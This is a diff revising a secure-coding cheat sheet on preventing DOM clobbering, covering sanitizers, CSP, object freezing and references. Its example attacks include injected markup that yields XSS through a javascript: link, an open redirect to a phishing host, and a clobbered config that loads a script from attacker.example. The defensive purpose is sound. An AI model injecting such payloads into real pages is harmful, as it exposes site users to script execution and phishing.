@@ -17,10 +17,10 @@ When a webpage is loaded, the browser creates a [DOM tree](https://developer.moz
 When creating the DOM tree, browsers also create an attribute for (some) named HTML elements on `window` and `document` objects. Named HTML elements are those having an `id` or `name` attribute. For example, the markup:
 
 ```html
-<form id=x></a>
+<form id=x name=x></form>
 ```
 
-will lead to browsers creating references to that form element with the attribute `x` of `window` and `document`:
+creates named references to the form on `window` and `document`. The `name` attribute is needed for [named access on `document`](https://html.spec.whatwg.org/multipage/dom.html#dom-document-nameditem); a form's `id` alone does not provide that reference:
 
 ```js
 var obj1 = document.getElementById('x');
@@ -48,19 +48,19 @@ location.assign(redirectTo);
 
 The attacker can:
 
-- inject the markup `<a id=redirectTo href='javascript:alert(1)'` and obtain XSS.
-- inject the markup `<a id=redirectTo href='phishing.com'` and obtain open redirect.
+- inject the markup `<a id=redirectTo href='javascript:alert(1)'></a>` and obtain XSS.
+- inject the markup `<a id=redirectTo href='https://phishing.example/'></a>` and obtain open redirect.
 
 ### Example Attack 2
 
 ```javascript
 var script = document.createElement('script');
 let src = window.config.url || 'script.js';
-s.src = src;
-document.body.appendChild(s);
+script.src = src;
+document.body.appendChild(script);
 ```
 
-The attacker can inject the markup `<a id=config><a id=config name=url href='malicious.js'>` to load additional JavaScript code, and obtain arbitrary client-side code execution.
+The attacker can inject the markup `<a id=config></a><a id=config name=url href='https://attacker.example/payload.js'></a>` to load additional JavaScript code, and obtain arbitrary client-side code execution.
 
 ## Summary of Guidelines
 
@@ -70,7 +70,7 @@ For quick reference, below is the summary of guidelines discussed next.
 |----|---------------------------------------------------------------|---------------------------------------------------------------------------|
 | \# 1  | Use HTML Sanitizers                                           | [link](#1-html-sanitization)                                              |
 | \# 2  | Use Content-Security Policy                                   | [link](#2-content-security-policy)                                        |
-| \# 3  | Freeze Sensitive DOM Objects                                  | [link](#3-freezing-sensitive-dom-objects)                                 |
+| \# 3  | Freeze Application Configuration Objects                                  | [link](#3-freezing-application-configuration-objects)                                 |
 | \# 4  | Validate All Inputs to DOM Tree                               | [link](#4-validate-all-inputs-to-dom-tree)                                |
 | \# 5  | Use Explicit Variable Declarations                            | [link](#5-use-explicit-variable-declarations)                             |
 | \# 6  | Do Not Use Document and Window for Global Variables           | [link](#6-do-not-use-document-and-window-for-global-variables)            |
@@ -108,17 +108,16 @@ This would isolate the namespace of named properties and JavaScript variables by
 
 #### Sanitizer API
 
-The new browser-built-in [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API) does not prevent DOM Clobbering it its [default setting](https://wicg.github.io/sanitizer-api/#dom-clobbering), but can be configured to remove named properties:
+Use the browser's [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/Sanitizer) only where the required methods are supported. Start with its default configuration and explicitly disallow `id` and `name` using [`removeAttribute()`](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/removeAttribute), which removes the attribute from all elements:
 
 ```js
-const sanitizerInstance = new Sanitizer({
-  blockAttributes: [
-    {'name': 'id', elements: '*'},
-    {'name': 'name', elements: '*'}
-  ]
-});
+const sanitizerInstance = new Sanitizer();
+sanitizerInstance.removeAttribute('id');
+sanitizerInstance.removeAttribute('name');
 containerDOMElement.setHTML(input, {sanitizer: sanitizerInstance});
 ```
+
+This example assumes the application does not need `id` or `name` attributes in the untrusted markup. In unsupported browsers, use the DOMPurify configuration above; do not fall back to inserting unsanitized HTML.
 
 ### \#2: Content-Security Policy
 
@@ -126,11 +125,11 @@ containerDOMElement.setHTML(input, {sanitizer: sanitizerInstance});
 
 **Note:** CSP can only mitigate **some variants** of DOM clobbering attacks, such as when attackers attempt to load new scripts by clobbering script sources, but not when already-present code can be abused for code execution, e.g., clobbering the parameters of code evaluation constructs like `eval()`.
 
-### \#3: Freezing Sensitive DOM Objects
+### \#3: Freezing Application Configuration Objects
 
-A simple way to mitigate DOM Clobbering against individual objects could be to freeze sensitive DOM objects and their properties, e.g., via [Object.freeze()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze) method.
+Use [Object.freeze()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze#description) only as an additional control for application-owned configuration objects initialized with trusted values and retained in local scope. It prevents replacement of their own data properties, but is shallow: nested objects and values returned by getters can still change.
 
-**Note:** Freezing object properties prevents them from being overwritten by named DOM elements. But, determining all objects and object properties that need to be frozen may be not be easy, limiting the usefulness of this approach.
+Do not rely on freezing `window`, `document`, or DOM elements to prevent named-property clobbering. For example, [`window` rejects attempts to prevent extensions](https://html.spec.whatwg.org/multipage/nav-history-apis.html#windowproxy-preventextensions), so `Object.freeze(window)` throws. Use [HTML sanitization](#1-html-sanitization) and [local variables](#11-limit-variables-to-local-scope) to avoid attacker-controlled named-property lookups.
 
 ## Secure Coding Guidelines
 
@@ -186,8 +185,6 @@ Encapsulating variables and functions within objects or classes can help prevent
 
 ## References
 
-- [domclob.xyz](https://domclob.xyz)
-- [PortSwigger: DOM Clobbering Strikes Back](https://portswigger.net/research/dom-clobbering-strikes-back)
-- [Blogpost: XSS in GMail’s AMP4Email](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)
-- [HackTricks: DOM Clobbering](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)
-- [HTMLHell: DOM Clobbering](https://www.htmhell.dev/adventcalendar/2022/12/)
+- [WHATWG HTML: Named Access on the Window Object](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object)
+- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
+- [WHATWG Web IDL: Legacy Platform Object Abstract Operations](https://webidl.spec.whatwg.org/#legacy-platform-object-abstract-ops)
